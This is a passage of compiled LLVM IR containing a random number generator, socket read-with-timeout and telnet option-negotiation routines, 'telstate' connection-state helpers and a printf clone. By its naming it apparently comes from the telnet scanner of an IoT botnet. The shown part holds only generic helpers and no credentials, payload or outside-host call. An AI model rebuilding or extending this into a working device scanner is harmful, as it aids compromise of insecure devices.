  store i32 %0, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %1 = add i32 %0, -1640531527
  store i32 %1, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %2 = add i32 %0, 1013904242
  store i32 %2, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  %vector.recur.init = insertelement <2 x i32> undef, i32 %0, i32 1
  %load_initial = load <2 x i32>, <2 x i32>* bitcast (i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1) to <2 x i32>*), align 4
  br label %vector.body

vector.body:                                      ; preds = %vector.body, %min.iters.checked
  %store_forwarded = phi <2 x i32> [ %load_initial, %min.iters.checked ], [ %16, %vector.body ]
  %index = phi i64 [ 0, %min.iters.checked ], [ %index.next.1, %vector.body ]
  %vector.recur = phi <2 x i32> [ %vector.recur.init, %min.iters.checked ], [ %8, %vector.body ]
  %vec.ind = phi <2 x i64> [ <i64 3, i64 4>, %min.iters.checked ], [ %vec.ind.next.1, %vector.body ]
  %3 = or i64 %index, 3
  %4 = shufflevector <2 x i32> %vector.recur, <2 x i32> %store_forwarded, <2 x i32> <i32 1, i32 2>
  %5 = trunc <2 x i64> %vec.ind to <2 x i32>
  %6 = xor <2 x i32> %5, <i32 -1640531527, i32 -1640531527>
  %7 = xor <2 x i32> %6, %4
  %8 = xor <2 x i32> %7, %store_forwarded
  %9 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %3
  %10 = bitcast i32* %9 to <2 x i32>*
  store <2 x i32> %8, <2 x i32>* %10, align 4
  %vec.ind.next = add <2 x i64> %vec.ind, <i64 2, i64 2>
  %11 = add nsw i64 %index, 5
  %12 = shufflevector <2 x i32> %store_forwarded, <2 x i32> %8, <2 x i32> <i32 1, i32 2>
  %13 = trunc <2 x i64> %vec.ind.next to <2 x i32>
  %14 = xor <2 x i32> %13, <i32 -1640531527, i32 -1640531527>
  %15 = xor <2 x i32> %14, %12
  %16 = xor <2 x i32> %15, %8
  %17 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %11
  %18 = bitcast i32* %17 to <2 x i32>*
  store <2 x i32> %16, <2 x i32>* %18, align 4
  %index.next.1 = add nsw i64 %index, 4
  %vec.ind.next.1 = add <2 x i64> %vec.ind, <i64 4, i64 4>
  %19 = icmp eq i64 %index.next.1, 4092
  br i1 %19, label %middle.block, label %vector.body, !llvm.loop !1

middle.block:                                     ; preds = %vector.body
  br label %._crit_edge

._crit_edge:                                      ; preds = %middle.block
  %vector.recur.extract = extractelement <2 x i32> %8, i32 1
  %20 = load i32, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 4093), align 4
  %21 = xor i32 %vector.recur.extract, -1640532410
  %22 = xor i32 %21, %20
  store i32 %22, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 4095), align 4
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define i32 @rand_cmwc() local_unnamed_addr #3 {
  %1 = load i32, i32* @rand_cmwc.i, align 4
  %2 = add i32 %1, 1
  %3 = and i32 %2, 4095
  store i32 %3, i32* @rand_cmwc.i, align 4
  %4 = zext i32 %3 to i64
  %5 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %4
  %6 = load i32, i32* %5, align 4
  %7 = zext i32 %6 to i64
  %8 = mul nuw nsw i64 %7, 18782
  %9 = load i32, i32* @c, align 4
  %10 = zext i32 %9 to i64
  %11 = add nuw nsw i64 %8, %10
  %12 = lshr i64 %11, 32
  %13 = trunc i64 %12 to i32
  %14 = add nuw nsw i64 %12, %11
  %15 = trunc i64 %14 to i32
  %16 = icmp ult i32 %15, %13
  %17 = zext i1 %16 to i32
  %storemerge = add nuw nsw i32 %17, %13
  store i32 %storemerge, i32* @c, align 4
  %.neg7 = sext i1 %16 to i32
  %.0.neg = sub i32 -2, %15
  %18 = add i32 %.0.neg, %.neg7
  store i32 %18, i32* %5, align 4
  ret i32 %18
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_string(i8*, i8** nocapture readonly) local_unnamed_addr #1 {
  br label %3

; <label>:3:                                      ; preds = %3, %2
  %indvars.iv13 = phi i64 [ %indvars.iv.next14, %3 ], [ 0, %2 ]
  %indvars.iv.next14 = add nuw nsw i64 %indvars.iv13, 1
  %4 = getelementptr inbounds i8*, i8** %1, i64 %indvars.iv.next14
  %5 = load i8*, i8** %4, align 8
  %6 = icmp eq i8* %5, null
  br i1 %6, label %.preheader, label %3

.preheader:                                       ; preds = %3
  %7 = trunc i64 %indvars.iv13 to i32
  %8 = icmp slt i32 %7, 0
  br i1 %8, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  %sext = shl i64 %indvars.iv13, 32
  %9 = ashr exact i64 %sext, 32
  br label %.lr.ph

; <label>:10:                                     ; preds = %.lr.ph
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %11 = icmp slt i64 %indvars.iv, %9
  br i1 %11, label %.lr.ph, label %._crit_edge.loopexit

.lr.ph:                                           ; preds = %.lr.ph.preheader, %10
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %10 ]
  %12 = getelementptr inbounds i8*, i8** %1, i64 %indvars.iv
  %13 = load i8*, i8** %12, align 8
  %14 = tail call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %0, i8* %13) #7
  %15 = icmp eq i32 %14, 0
  br i1 %15, label %10, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph, %10
  %.09.ph = phi i32 [ 0, %10 ], [ 1, %.lr.ph ]
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.09 = phi i32 [ 0, %.preheader ], [ %.09.ph, %._crit_edge.loopexit ]
  ret i32 %.09
}

declare i32 @strcasestr(...) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define i32 @read_with_timeout(i32, i32, i8*, i32) local_unnamed_addr #1 {
  %5 = alloca %struct.fd_set, align 8
  %6 = alloca %struct.timeval, align 8
  %7 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 0
  store i64 0, i64* %7, align 8
  %8 = sext i32 %1 to i64
  %9 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 1
  store i64 %8, i64* %9, align 8
  %10 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %5, i64 0, i32 0, i64 0
  %11 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %10) #7, !srcloc !4
  %12 = srem i32 %0, 64
  %13 = zext i32 %12 to i64
  %14 = shl i64 1, %13
  %15 = sdiv i32 %0, 64
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %5, i64 0, i32 0, i64 %16
  %18 = load i64, i64* %17, align 8
  %19 = or i64 %18, %14
  store i64 %19, i64* %17, align 8
  %20 = add nsw i32 %0, 1
  %21 = call i32 @select(i32 %20, %struct.fd_set* nonnull %5, %struct.fd_set* null, %struct.fd_set* null, %struct.timeval* nonnull %6) #7
  %22 = icmp slt i32 %21, 1
  br i1 %22, label %27, label %23

; <label>:23:                                     ; preds = %4
  %24 = sext i32 %3 to i64
  %25 = call i64 @recv(i32 %0, i8* %2, i64 %24, i32 0) #7
  %26 = trunc i64 %25 to i32
  br label %27

; <label>:27:                                     ; preds = %4, %23
  %.0 = phi i32 [ %26, %23 ], [ 0, %4 ]
  ret i32 %.0
}

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) local_unnamed_addr #2

declare i64 @recv(i32, i8*, i64, i32) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define i32 @read_until_response(i32, i32, i8*, i32, i8** nocapture readonly) local_unnamed_addr #1 {
  %6 = sext i32 %3 to i64
  tail call void @llvm.memset.p0i8.i64(i8* %2, i8 0, i64 %6, i32 1, i1 false)
  %7 = tail call i32 @read_with_timeout(i32 %0, i32 %1, i8* %2, i32 %3)
  %8 = tail call i32 @contains_string(i8* %2, i8** %4)
  %not. = icmp ne i32 %8, 0
  %.0 = zext i1 %not. to i32
  ret i32 %.0
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #4

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) local_unnamed_addr #1 {
  %4 = alloca i8, align 1
  %5 = getelementptr inbounds i8, i8* %1, i64 1
  %6 = load i8, i8* %5, align 1
  %.off = add i8 %6, 5
  %switch = icmp ult i8 %.off, 4
  br i1 %switch, label %7, label %20

; <label>:7:                                      ; preds = %3
  store i8 -1, i8* %4, align 1
  %8 = call i64 @send(i32 %0, i8* nonnull %4, i64 1, i32 16384) #7
  %9 = load i8, i8* %5, align 1
  switch i8 %9, label %13 [
    i8 -4, label %10
    i8 -2, label %11
    i8 3, label %12
  ]

; <label>:10:                                     ; preds = %7
  store i8 -2, i8* %4, align 1
  br label %16

; <label>:11:                                     ; preds = %7
  store i8 -4, i8* %4, align 1
  br label %16

; <label>:12:                                     ; preds = %7
  store i8 -3, i8* %4, align 1
  br label %16

; <label>:13:                                     ; preds = %7
  %14 = icmp eq i8 %9, -3
  %15 = select i1 %14, i8 -4, i8 -2
  store i8 %15, i8* %4, align 1
  br label %16

; <label>:16:                                     ; preds = %11, %13, %12, %10
  %17 = call i64 @send(i32 %0, i8* nonnull %4, i64 1, i32 16384) #7
  %18 = getelementptr inbounds i8, i8* %1, i64 2
  %19 = call i64 @send(i32 %0, i8* %18, i64 1, i32 16384) #7
  br label %20

; <label>:20:                                     ; preds = %3, %16
  ret i32 0
}

declare i64 @send(i32, i8*, i64, i32) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define i8* @get_telstate_host(%struct.telstate_t* nocapture readonly) local_unnamed_addr #1 {
  %2 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 1
  %3 = load i32, i32* %2, align 4
  %4 = tail call i8* @inet_ntoa(i32 %3) #7
  ret i8* %4
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @advance_telstate(%struct.telstate_t* nocapture, i32) local_unnamed_addr #1 {
  %3 = icmp eq i32 %1, 0
  br i1 %3, label %4, label %8

; <label>:4:                                      ; preds = %2
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 0
  %6 = load i32, i32* %5, align 8
  %7 = tail call i32 @close(i32 %6) #7
  br label %8

; <label>:8:                                      ; preds = %4, %2
  %9 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 7
  store i32 0, i32* %9, align 8
  %10 = trunc i32 %1 to i8
  %11 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 2
  store i8 %10, i8* %11, align 8
  %12 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 9
  %13 = load i8*, i8** %12, align 8
  tail call void @llvm.memset.p0i8.i64(i8* %13, i8 0, i64 1024, i32 1, i1 false)
  ret void
}

declare i32 @close(i32) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define void @reset_telstate(%struct.telstate_t* nocapture) local_unnamed_addr #1 {
  tail call void @advance_telstate(%struct.telstate_t* %0, i32 0)
  %2 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 3
  store i8 1, i8* %2, align 1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8* nocapture) local_unnamed_addr #1 {
  %2 = tail call i64 @strlen(i8* %0) #14
  %3 = add i64 %2, 4294967295
  br label %4

; <label>:4:                                      ; preds = %4, %1
  %indvars.iv29 = phi i64 [ %indvars.iv.next30, %4 ], [ 0, %1 ]
  %5 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv29
  %6 = load i8, i8* %5, align 1
  %7 = sext i8 %6 to i32
  %8 = tail call i32 @isspace(i32 %7) #14
  %9 = icmp eq i32 %8, 0
  %indvars.iv.next30 = add nuw i64 %indvars.iv29, 1
  br i1 %9, label %.preheader, label %4

.preheader:                                       ; preds = %4
  %10 = trunc i64 %3 to i32
  %11 = trunc i64 %indvars.iv29 to i32
  %12 = icmp slt i32 %10, %11
  br i1 %12, label %.critedge.preheader, label %.lr.ph22.preheader

.lr.ph22.preheader:                               ; preds = %.preheader
  %sext = shl i64 %3, 32
  %13 = ashr exact i64 %sext, 32
  %sext31 = shl i64 %indvars.iv29, 32
  %14 = ashr exact i64 %sext31, 32
  br label %.lr.ph22

.critedge.preheader.loopexit:                     ; preds = %.lr.ph22, %80
  %.0.lcssa.ph = phi i32 [ %79, %.lr.ph22 ], [ %81, %80 ]
  br label %.critedge.preheader

.critedge.preheader:                              ; preds = %.critedge.preheader.loopexit, %.preheader
  %.0.lcssa = phi i32 [ %10, %.preheader ], [ %.0.lcssa.ph, %.critedge.preheader.loopexit ]
  %15 = icmp sgt i32 %11, %.0.lcssa
  br i1 %15, label %.critedge._crit_edge, label %.critedge.preheader26

.critedge.preheader26:                            ; preds = %.critedge.preheader
  %sext32 = shl i64 %indvars.iv29, 32
  %16 = ashr exact i64 %sext32, 32
  %17 = sext i32 %.0.lcssa to i64
  %18 = icmp sgt i64 %17, %16
  %smax = select i1 %18, i64 %17, i64 %16
  %19 = add nsw i64 %smax, 1
  %20 = sub nsw i64 %19, %16
  %min.iters.check = icmp ult i64 %20, 32
  br i1 %min.iters.check, label %.critedge.preheader39, label %min.iters.checked

.critedge.preheader39:                            ; preds = %middle.block, %vector.memcheck, %min.iters.checked, %.critedge.preheader26
  %indvars.iv.ph = phi i64 [ %16, %vector.memcheck ], [ %16, %min.iters.checked ], [ %16, %.critedge.preheader26 ], [ %ind.end, %middle.block ]
  br label %.critedge

min.iters.checked:                                ; preds = %.critedge.preheader26
  %n.vec = and i64 %20, -32
  %cmp.zero = icmp eq i64 %n.vec, 0
  br i1 %cmp.zero, label %.critedge.preheader39, label %vector.memcheck

vector.memcheck:                                  ; preds = %min.iters.checked
  %21 = icmp sgt i64 %17, %16
  %smax34 = select i1 %21, i64 %17, i64 %16
  %22 = add nsw i64 %smax34, 1
  %23 = sub nsw i64 %22, %16
  %scevgep = getelementptr i8, i8* %0, i64 %23
  %scevgep35 = getelementptr i8, i8* %0, i64 %16
  %scevgep36 = getelementptr i8, i8* %0, i64 %22
  %bound0 = icmp ugt i8* %scevgep36, %0
  %bound1 = icmp ult i8* %scevgep35, %scevgep
  %memcheck.conflict = and i1 %bound0, %bound1
  %ind.end = add nsw i64 %16, %n.vec
  br i1 %memcheck.conflict, label %.critedge.preheader39, label %vector.body.preheader

vector.body.preheader:                            ; preds = %vector.memcheck
  %24 = add nsw i64 %n.vec, -32
  %25 = lshr exact i64 %24, 5
  %26 = add nuw nsw i64 %25, 1
  %xtraiter = and i64 %26, 3
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  br i1 %lcmp.mod, label %vector.body.prol.loopexit, label %vector.body.prol.preheader

vector.body.prol.preheader:                       ; preds = %vector.body.preheader
  br label %vector.body.prol

vector.body.prol:                                 ; preds = %vector.body.prol, %vector.body.prol.preheader
  %index.prol = phi i64 [ %index.next.prol, %vector.body.prol ], [ 0, %vector.body.prol.preheader ]
  %prol.iter = phi i64 [ %prol.iter.sub, %vector.body.prol ], [ %xtraiter, %vector.body.prol.preheader ]
  %27 = add i64 %16, %index.prol
  %28 = getelementptr inbounds i8, i8* %0, i64 %27
  %29 = bitcast i8* %28 to <16 x i8>*
  %wide.load.prol = load <16 x i8>, <16 x i8>* %29, align 1, !alias.scope !5
  %30 = getelementptr i8, i8* %28, i64 16
  %31 = bitcast i8* %30 to <16 x i8>*
  %wide.load38.prol = load <16 x i8>, <16 x i8>* %31, align 1, !alias.scope !5
  %32 = getelementptr inbounds i8, i8* %0, i64 %index.prol
  %33 = bitcast i8* %32 to <16 x i8>*
  store <16 x i8> %wide.load.prol, <16 x i8>* %33, align 1, !alias.scope !8, !noalias !5
  %34 = getelementptr i8, i8* %32, i64 16
  %35 = bitcast i8* %34 to <16 x i8>*
  store <16 x i8> %wide.load38.prol, <16 x i8>* %35, align 1, !alias.scope !8, !noalias !5
  %index.next.prol = add i64 %index.prol, 32
  %prol.iter.sub = add i64 %prol.iter, -1
  %prol.iter.cmp = icmp eq i64 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %vector.body.prol.loopexit.unr-lcssa, label %vector.body.prol, !llvm.loop !10

vector.body.prol.loopexit.unr-lcssa:              ; preds = %vector.body.prol
  br label %vector.body.prol.loopexit

vector.body.prol.loopexit:                        ; preds = %vector.body.preheader, %vector.body.prol.loopexit.unr-lcssa
  %index.unr = phi i64 [ 0, %vector.body.preheader ], [ %index.next.prol, %vector.body.prol.loopexit.unr-lcssa ]
  %36 = icmp ult i64 %24, 96
  br i1 %36, label %middle.block, label %vector.body.preheader.new

vector.body.preheader.new:                        ; preds = %vector.body.prol.loopexit
  br label %vector.body

vector.body:                                      ; preds = %vector.body, %vector.body.preheader.new
  %index = phi i64 [ %index.unr, %vector.body.preheader.new ], [ %index.next.3, %vector.body ]
  %37 = add i64 %16, %index
  %38 = getelementptr inbounds i8, i8* %0, i64 %37
  %39 = bitcast i8* %38 to <16 x i8>*
  %wide.load = load <16 x i8>, <16 x i8>* %39, align 1, !alias.scope !5
  %40 = getelementptr i8, i8* %38, i64 16
  %41 = bitcast i8* %40 to <16 x i8>*
  %wide.load38 = load <16 x i8>, <16 x i8>* %41, align 1, !alias.scope !5
  %42 = getelementptr inbounds i8, i8* %0, i64 %index
  %43 = bitcast i8* %42 to <16 x i8>*
  store <16 x i8> %wide.load, <16 x i8>* %43, align 1, !alias.scope !8, !noalias !5
  %44 = getelementptr i8, i8* %42, i64 16
  %45 = bitcast i8* %44 to <16 x i8>*
  store <16 x i8> %wide.load38, <16 x i8>* %45, align 1, !alias.scope !8, !noalias !5
  %index.next = add i64 %index, 32
  %46 = add i64 %16, %index.next
  %47 = getelementptr inbounds i8, i8* %0, i64 %46
  %48 = bitcast i8* %47 to <16 x i8>*
  %wide.load.1 = load <16 x i8>, <16 x i8>* %48, align 1, !alias.scope !5
  %49 = getelementptr i8, i8* %47, i64 16
  %50 = bitcast i8* %49 to <16 x i8>*
  %wide.load38.1 = load <16 x i8>, <16 x i8>* %50, align 1, !alias.scope !5
  %51 = getelementptr inbounds i8, i8* %0, i64 %index.next
  %52 = bitcast i8* %51 to <16 x i8>*
  store <16 x i8> %wide.load.1, <16 x i8>* %52, align 1, !alias.scope !8, !noalias !5
  %53 = getelementptr i8, i8* %51, i64 16
  %54 = bitcast i8* %53 to <16 x i8>*
  store <16 x i8> %wide.load38.1, <16 x i8>* %54, align 1, !alias.scope !8, !noalias !5
  %index.next.1 = add i64 %index, 64
  %55 = add i64 %16, %index.next.1
  %56 = getelementptr inbounds i8, i8* %0, i64 %55
  %57 = bitcast i8* %56 to <16 x i8>*
  %wide.load.2 = load <16 x i8>, <16 x i8>* %57, align 1, !alias.scope !5
  %58 = getelementptr i8, i8* %56, i64 16
  %59 = bitcast i8* %58 to <16 x i8>*
  %wide.load38.2 = load <16 x i8>, <16 x i8>* %59, align 1, !alias.scope !5
  %60 = getelementptr inbounds i8, i8* %0, i64 %index.next.1
  %61 = bitcast i8* %60 to <16 x i8>*
  store <16 x i8> %wide.load.2, <16 x i8>* %61, align 1, !alias.scope !8, !noalias !5
  %62 = getelementptr i8, i8* %60, i64 16
  %63 = bitcast i8* %62 to <16 x i8>*
  store <16 x i8> %wide.load38.2, <16 x i8>* %63, align 1, !alias.scope !8, !noalias !5
  %index.next.2 = add i64 %index, 96
  %64 = add i64 %16, %index.next.2
  %65 = getelementptr inbounds i8, i8* %0, i64 %64
  %66 = bitcast i8* %65 to <16 x i8>*
  %wide.load.3 = load <16 x i8>, <16 x i8>* %66, align 1, !alias.scope !5
  %67 = getelementptr i8, i8* %65, i64 16
  %68 = bitcast i8* %67 to <16 x i8>*
  %wide.load38.3 = load <16 x i8>, <16 x i8>* %68, align 1, !alias.scope !5
  %69 = getelementptr inbounds i8, i8* %0, i64 %index.next.2
  %70 = bitcast i8* %69 to <16 x i8>*
  store <16 x i8> %wide.load.3, <16 x i8>* %70, align 1, !alias.scope !8, !noalias !5
  %71 = getelementptr i8, i8* %69, i64 16
  %72 = bitcast i8* %71 to <16 x i8>*
  store <16 x i8> %wide.load38.3, <16 x i8>* %72, align 1, !alias.scope !8, !noalias !5
  %index.next.3 = add i64 %index, 128
  %73 = icmp eq i64 %index.next.3, %n.vec
  br i1 %73, label %middle.block.unr-lcssa, label %vector.body, !llvm.loop !12

middle.block.unr-lcssa:                           ; preds = %vector.body
  br label %middle.block

middle.block:                                     ; preds = %vector.body.prol.loopexit, %middle.block.unr-lcssa
  %cmp.n = icmp eq i64 %20, %n.vec
  br i1 %cmp.n, label %.critedge._crit_edge, label %.critedge.preheader39

.lr.ph22:                                         ; preds = %.lr.ph22.preheader, %80
  %indvars.iv27 = phi i64 [ %13, %.lr.ph22.preheader ], [ %indvars.iv.next28, %80 ]
  %.021 = phi i32 [ %10, %.lr.ph22.preheader ], [ %81, %80 ]
  %74 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv27
  %75 = load i8, i8* %74, align 1
  %76 = sext i8 %75 to i32
  %77 = tail call i32 @isspace(i32 %76) #14
  %78 = icmp eq i32 %77, 0
  %79 = trunc i64 %indvars.iv27 to i32
  br i1 %78, label %.critedge.preheader.loopexit, label %80

; <label>:80:                                     ; preds = %.lr.ph22
  %indvars.iv.next28 = add nsw i64 %indvars.iv27, -1
  %81 = add nsw i32 %.021, -1
  %82 = icmp sgt i64 %indvars.iv27, %14
  br i1 %82, label %.lr.ph22, label %.critedge.preheader.loopexit

.critedge:                                        ; preds = %.critedge.preheader39, %.critedge
  %indvars.iv = phi i64 [ %indvars.iv.next, %.critedge ], [ %indvars.iv.ph, %.critedge.preheader39 ]
  %83 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %84 = load i8, i8* %83, align 1
  %85 = sub nsw i64 %indvars.iv, %16
  %86 = getelementptr inbounds i8, i8* %0, i64 %85
  store i8 %84, i8* %86, align 1
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %87 = icmp slt i64 %indvars.iv, %17
  br i1 %87, label %.critedge, label %.critedge._crit_edge.loopexit, !llvm.loop !13

.critedge._crit_edge.loopexit:                    ; preds = %.critedge
  br label %.critedge._crit_edge

.critedge._crit_edge:                             ; preds = %.critedge._crit_edge.loopexit, %middle.block, %.critedge.preheader
  %.019.lcssa = phi i64 [ %indvars.iv29, %.critedge.preheader ], [ %ind.end, %middle.block ], [ %indvars.iv.next, %.critedge._crit_edge.loopexit ]
  %88 = sub i64 %.019.lcssa, %indvars.iv29
  %sext33 = shl i64 %88, 32
  %89 = ashr exact i64 %sext33, 32
  %90 = getelementptr inbounds i8, i8* %0, i64 %89
  store i8 0, i8* %90, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8* nocapture) local_unnamed_addr #6

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) local_unnamed_addr #6

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %2 = alloca [1 x %struct.__va_list_tag], align 16
  %3 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %2, i64 0, i64 0
  %4 = bitcast [1 x %struct.__va_list_tag]* %2 to i8*
  call void @llvm.va_start(i8* nonnull %4)
  %5 = call fastcc i32 @print(i8** null, i8* %0, %struct.__va_list_tag* nonnull %3)
  ret i32 %5
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #7

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @print(i8**, i8* nocapture readonly, %struct.__va_list_tag*) unnamed_addr #1 {
  %4 = alloca [2 x i8], align 1
  %5 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %6 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %7 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %8 = getelementptr inbounds [2 x i8], [2 x i8]* %4, i64 0, i64 0
  %9 = getelementptr inbounds [2 x i8], [2 x i8]* %4, i64 0, i64 1
  br label %10

; <label>:10:                                     ; preds = %138, %3
  %.061 = phi i32 [ 0, %3 ], [ %.162, %138 ]
  %.0 = phi i8* [ %1, %3 ], [ %139, %138 ]
  %11 = load i8, i8* %.0, align 1
  switch i8 %11, label %134 [
    i8 0, label %140
    i8 37, label %12
  ]

; <label>:12:                                     ; preds = %10
  %13 = getelementptr inbounds i8, i8* %.0, i64 1
  %14 = load i8, i8* %13, align 1
  switch i8 %14, label %.preheader70 [
    i8 0, label %140
    i8 37, label %134
    i8 45, label %15
  ]

; <label>:15:                                     ; preds = %12
  %16 = getelementptr inbounds i8, i8* %.0, i64 2
  %.pre = load i8, i8* %16, align 1
  br label %.preheader70

.preheader70:                                     ; preds = %15, %12
  %17 = phi i8 [ %14, %12 ], [ %.pre, %15 ]
  %.063.ph = phi i32 [ 0, %12 ], [ 1, %15 ]
  %.1.ph = phi i8* [ %13, %12 ], [ %16, %15 ]
  %18 = icmp eq i8 %17, 48
  br i1 %18, label %.lr.ph.preheader, label %.preheader

.lr.ph.preheader:                                 ; preds = %.preheader70
  br label %.lr.ph

.preheader.loopexit:                              ; preds = %.lr.ph
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader70
  %19 = phi i8 [ %17, %.preheader70 ], [ %23, %.preheader.loopexit ]
  %.063.lcssa = phi i32 [ %.063.ph, %.preheader70 ], [ %22, %.preheader.loopexit ]
  %.1.lcssa = phi i8* [ %.1.ph, %.preheader70 ], [ %21, %.preheader.loopexit ]
  %.off74 = add i8 %19, -48
  %20 = icmp ult i8 %.off74, 10
  br i1 %20, label %.lr.ph77.preheader, label %.critedge

.lr.ph77.preheader:                               ; preds = %.preheader
  br label %.lr.ph77

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.172 = phi i8* [ %21, %.lr.ph ], [ %.1.ph, %.lr.ph.preheader ]
  %.06371 = phi i32 [ %22, %.lr.ph ], [ %.063.ph, %.lr.ph.preheader ]
  %21 = getelementptr inbounds i8, i8* %.172, i64 1
  %22 = or i32 %.06371, 2
  %23 = load i8, i8* %21, align 1
  %24 = icmp eq i8 %23, 48
  br i1 %24, label %.lr.ph, label %.preheader.loopexit

.lr.ph77:                                         ; preds = %.lr.ph77.preheader, %.lr.ph77
  %25 = phi i8 [ %31, %.lr.ph77 ], [ %19, %.lr.ph77.preheader ]
  %.276 = phi i8* [ %30, %.lr.ph77 ], [ %.1.lcssa, %.lr.ph77.preheader ]
  %.06475 = phi i32 [ %29, %.lr.ph77 ], [ 0, %.lr.ph77.preheader ]
  %26 = zext i8 %25 to i32
  %27 = mul nsw i32 %.06475, 10
  %28 = add i32 %27, -48
  %29 = add i32 %28, %26
  %30 = getelementptr inbounds i8, i8* %.276, i64 1
  %31 = load i8, i8* %30, align 1
  %.off = add i8 %31, -48
  %32 = icmp ult i8 %.off, 10
  br i1 %32, label %.lr.ph77, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph77
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %.preheader
  %.064.lcssa = phi i32 [ 0, %.preheader ], [ %29, %.critedge.loopexit ]
  %.2.lcssa = phi i8* [ %.1.lcssa, %.preheader ], [ %30, %.critedge.loopexit ]
  %.lcssa = phi i8 [ %19, %.preheader ], [ %31, %.critedge.loopexit ]
  switch i8 %.lcssa, label %138 [
    i8 115, label %33
    i8 100, label %53
    i8 120, label %69
    i8 88, label %85
    i8 117, label %101
    i8 99, label %117
  ]

; <label>:33:                                     ; preds = %.critedge
  %34 = load i32, i32* %5, align 8
  %35 = icmp ult i32 %34, 41
  br i1 %35, label %36, label %41

; <label>:36:                                     ; preds = %33
  %37 = load i8*, i8** %6, align 8
  %38 = sext i32 %34 to i64
  %39 = getelementptr i8, i8* %37, i64 %38
  %40 = add i32 %34, 8
  store i32 %40, i32* %5, align 8
  br label %44

; <label>:41:                                     ; preds = %33
  %42 = load i8*, i8** %7, align 8
  %43 = getelementptr i8, i8* %42, i64 8
  store i8* %43, i8** %7, align 8
  br label %44

; <label>:44:                                     ; preds = %41, %36
  %.in69 = phi i8* [ %39, %36 ], [ %42, %41 ]
  %45 = bitcast i8* %.in69 to i32*
  %46 = load i32, i32* %45, align 4
  %47 = sext i32 %46 to i64
  %48 = inttoptr i64 %47 to i8*
  %49 = icmp ne i32 %46, 0
  %50 = select i1 %49, i8* %48, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.133, i64 0, i64 0)
  %51 = tail call fastcc i32 @prints(i8** %0, i8* %50, i32 %.064.lcssa, i32 %.063.lcssa)
  %52 = add nsw i32 %51, %.061
  br label %138

; <label>:53:                                     ; preds = %.critedge
  %54 = load i32, i32* %5, align 8
  %55 = icmp ult i32 %54, 41
  br i1 %55, label %56, label %61

; <label>:56:                                     ; preds = %53
  %57 = load i8*, i8** %6, align 8
  %58 = sext i32 %54 to i64
